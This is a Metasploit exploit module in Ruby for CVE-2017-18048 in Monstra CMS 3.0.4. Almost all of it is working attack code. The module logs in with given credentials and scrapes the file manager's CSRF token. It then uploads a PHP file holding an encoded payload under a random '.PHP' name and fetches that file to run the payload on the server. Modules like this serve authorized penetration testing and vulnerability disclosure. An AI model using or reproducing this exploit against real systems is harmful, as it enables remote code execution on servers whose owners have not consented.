# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039; => &#039;Monstra CMS Authenticated Arbitrary File Upload&#039;,
      &#039;Description&#039; => %q{
         MonstraCMS 3.0.4 allows users to upload Arbitrary files which leads to remote command execution on the remote server.
         An attacker may choose to upload a file containing PHP code and run this code by accessing the resulting PHP file.
         This module was tested against MonstraCMS 3.0.4.
       },

      &#039;Author&#039; =>
        [
          &#039;Ishaq Mohammed <shaikhishaq201@gmail.com>&#039;, # Discoverer & Proof of Concept
          &#039;Touhid M.Shaikh <touhidshaikh22@gmail.com>&#039;, # Metasploit Module
        ],
      &#039;License&#039; => MSF_LICENSE,
      &#039;References&#039; =>
        [
          [&#039;CVE&#039;,&#039;2017-18048&#039;],
          [&#039;EDB&#039;,&#039;43348&#039;],
          [&#039;URL&#039;,&#039;https://blogs.securiteam.com/index.php/archives/3559&#039;],
          [&#039;URL&#039;,&#039;https://securityprince.blogspot.com/2017/12/monstra-cms-304-arbitrary-file-upload.html?m=1&#039;],
          [&#039;URL&#039;,&#039;https://www.youtube.com/watch?v=-ziZ6DELbzw&#039;]
        ],
       &#039;DefaultOptions&#039; =>
          {
            &#039;Encoder&#039; => &#039;php/base64&#039;
          },
       &#039;Privileged&#039; => false,
       &#039;Platform&#039;   => [&#039;php&#039;],
       &#039;Arch&#039;       => ARCH_PHP,
       &#039;Targets&#039; =>
        [
          [&#039;Monstra CMS 3.0.4&#039;, { }],
        ],
       &#039;DefaultTarget&#039;  => 0,
       &#039;DisclosureDate&#039; => &#039;Dec 18 2017&#039;))

        register_options(
        [
          OptString.new(&#039;TARGETURI&#039;, [ true, "Base Monstra CMS directory path", &#039;/&#039;]),
          OptString.new(&#039;USERNAME&#039;, [ true, "Username to authenticate with", &#039;&#039;]),
          OptString.new(&#039;PASSWORD&#039;, [ true, "Password to authenticate with", &#039;&#039;])
        ])
    end

  def check
    begin
      res = send_request_cgi({ &#039;uri&#039; => normalize_uri(target_uri.path,&#039;admin&#039;, &#039;index.php&#039;) })
    rescue
      vprint_error("Unable to access the index.php file")
      return CheckCode::Unknown
    end

    if res and res.code != 200
      vprint_error("Error accessing the index.php file")
      return CheckCode::Unknown
    end

    if res.body =~ /<\/a>.*?Version (\d+\.\d+\.\d+)/i
      version = Gem::Version.new($1)
      vulnVersion = Gem::Version.new(&#039;3.0.4&#039;)
      vprint_status("Monstra CMS: #{version}")

      if version > vulnVersion
        return CheckCode::Safe
      elsif version == vulnVersion
        return CheckCode::Appears
      elsif version < vulnVersion
        return CheckCode::Detected
      end
    end
  end

  def uri
    target_uri.path
  end

  def login
    res = nil
    vprint_status(&#039;Trying to Login ......&#039;)
    # Send Creds with cookies.
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(uri, &#039;admin&#039;, &#039;index.php&#039;),
      &#039;vars_post&#039; => {
        &#039;login&#039; => datastore[&#039;USERNAME&#039;],
        &#039;password&#039; => datastore[&#039;PASSWORD&#039;],
        &#039;login_submit&#039; => &#039;Log+In&#039;
      }
    })
    cookies = res.get_cookies

    fail_with(Failure::Unreachable, "#{peer} - Did not respond to Login request") if res.nil?

    # Try to access index page with authenticated cookie.
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(uri, &#039;admin&#039; &#039;/index.php&#039;),
      &#039;cookie&#039; => cookies
    })
    fail_with(Failure::Unreachable, "#{peer} - Did not respond to Login request") if res.nil?

    # if we redirect to core_welcome then we assume we have authenticated cookie.
    if res.code == 302 && res.headers[&#039;Location&#039;].include?(&#039;index.php?id=dashboard&#039;)
      print_good("Authentication successful : [ #{datastore[&#039;USERNAME&#039;]} : #{datastore[&#039;PASSWORD&#039;]} ]")
      store_valid_credential(user: datastore[&#039;USERNAME&#039;], private: datastore[&#039;PASSWORD&#039;])
      return cookies
    else
      fail_with(Failure::Unreachable, "#{peer} - Authentication Failed :[ #{datastore[&#039;USERNAME&#039;]}:#{datastore[&#039;PASSWORD&#039;]} ]")
    end
  end

  def exploit
    #Login Function Execute and Return Cookies
    cookies = login

    #Random payload name.
    pay_name = "#{rand_text_alpha(5..10)}.PHP"


    # Payload Gen.
    evilbyte = "<?php #{payload.encoded}; ?>"

    # Request for CSRF token for file upload.
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(uri, &#039;admin&#039;, &#039;/index.php&#039;),
      &#039;vars_get&#039; => {&#039;id&#039; => &#039;filesmanager&#039;},
      &#039;method&#039; => &#039;GET&#039;,
      &#039;cookie&#039; => cookies
    })

    # Grabbing CSRF token from body
    /<input type="hidden" id="csrf" name="csrf" value="(?<csrf>[a-z0-9"]+)">/ =~ res.body
    fail_with(Failure::Unreachable, "#{peer} - Could not determine CSRF token") if csrf.nil?
    vprint_good("CSRF-Token for File Upload : #{csrf}")

    # setup POST request.
    post_data = Rex::MIME::Message.new
    post_data.add_part(csrf, content_type = nil, transfer_encoding = nil, content_disposition = &#039;form-data; name="csrf"&#039;) # CSRF token #form-data; name="file"; filename="agent22.PHP"
    post_data.add_part("#{evilbyte}", content_type = &#039;application/x-php&#039;, transfer_encoding = nil, content_disposition = "form-data; name=\"file\"; filename=\"#{pay_name}\"")  # payload
    post_data.add_part("Upload", content_type = nil, transfer_encoding = nil, content_disposition = &#039;form-data; name="upload_file"&#039;)  # extra
    data = post_data.to_s

    vprint_status("Trying to upload file #{pay_name} with malicious content....")
    # Lets Send Upload request.
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(uri, &#039;admin&#039;, &#039;/index.php&#039;),
      &#039;vars_get&#039; => {&#039;id&#039; => &#039;filesmanager&#039;},
      &#039;method&#039; => &#039;POST&#039;,
      &#039;cookie&#039; => cookies,
      &#039;Connection&#039; => &#039;close&#039;,
      &#039;data&#039; => data,
      &#039;ctype&#039; => "multipart/form-data; boundary=#{post_data.bound}"
    })

    register_files_for_cleanup(pay_name)


    # Execute our payload simply call to payload.
    print_status("Executing Payload " )
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(uri, &#039;public&#039;, &#039;uploads&#039;, pay_name)
    })

  end
end

